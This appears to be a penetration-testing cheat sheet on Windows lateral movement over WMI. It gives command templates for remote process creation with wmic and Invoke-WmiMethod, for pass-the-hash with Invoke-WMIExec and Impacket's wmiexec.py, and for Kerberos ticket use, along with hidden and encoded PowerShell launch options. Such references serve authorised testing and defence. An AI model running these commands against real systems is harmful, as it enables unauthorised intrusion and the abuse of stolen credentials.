# Windows - Lateral movement - Over WMI

The `Windows Management Instrumentation (WMI)` is a Microsoft suite of tools
used to retrieve management data and manage Windows assets both locally and
over the network.

`WMI` rely on two protocols when used over the network: `DCOM` (by default) and
`WinRM`. DCOM establishes an initial connection over TCP port 135 and any
subsequent data is then exchanged over a randomly selected TCP port.

`WMI` is divided in a collection of predefined classes. The `Win32_Process`
class can be used to start a process and the `Win32_Product` class can be used
to install an MSI installer package, both locally and remotely.

```
# <COMMAND> example: <cmd.exe | powershell.exe | cmd.exe /c '<COMMAND> <COMMAND_ARGS>' | %ComSpec% /c '<COMMAND> <COMMAND_ARGS>' | powershell.exe -NoP -NonI -W Hidden -Exec Bypass -C '<COMMAND> <COMMAND_ARGS>' | powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc <ENCODED_BASE64_CMD> | ...>

wmic /node:"<IP | HOSTNAME>" process call create "<COMMAND>"
wmic /node:"<HOST1>","<HOST2>",...,"<HOST_N>" process call create "<COMMAND>"
# Takes in input a list of hosts in the given file.
wmic /failfast:on /node:@<FILE> process call create "<COMMAND>"
wmic /user:"<DOMAIN | WORKGROUP>\<USERNAME>" /password:"<PASSWORD>" /node:<IP | HOSTNAME> process call create "<COMMAND>"

Invoke-WmiMethod -Class Win32_Process -Name Create "<COMMAND>"
Invoke-WmiMethod -ComputerName <IP | HOSTNAME> -Credential <PSCredential> -Class Win32_Process -Name Create "<COMMAND>"
```

The `Invoke-WMIExec` PowerShell cmdlet and `Impacket`'s `wmiexec.py` can be
used to pass the hash over `WMI`. `wmiexec.py` additionally supports
authentication through the Kerberos protocol.

```
Invoke-WMIExec -Target <HOSTNAME | IP> -Domain <DOMAIN> -Username <USERNAME> -Hash <NTLMHASH> -Command "<CMD>" -verbose

# NTLM authentication
wmiexec.py [-target-ip <TARGET_IP>] [-port [<PORT>]] [<DOMAIN>/]<USERNAME>[:<PASSWORD>]@<HOSTNAME | IP> [<COMMAND> <COMMAND_ARGS>]
wmiexec.py -hashes <LM_HASH:NT_HASH> [-target-ip <TARGET_IP>] [-port [<PORT>]] [[<DOMAIN>/]<USERNAME>@<HOSTNAME | IP> [<COMMAND> <COMMAND_ARGS>]

# Kerberos authentication
export KRB5CCNAME=<TICKET_CCACHE_FILE_PATH>
wmiexec.py [-service-name <SERVICE_NAME>] -k -no-pass -dc-ip <DC_IP> <HOSTNAME> [<COMMAND> <COMMAND_ARGS>]
```
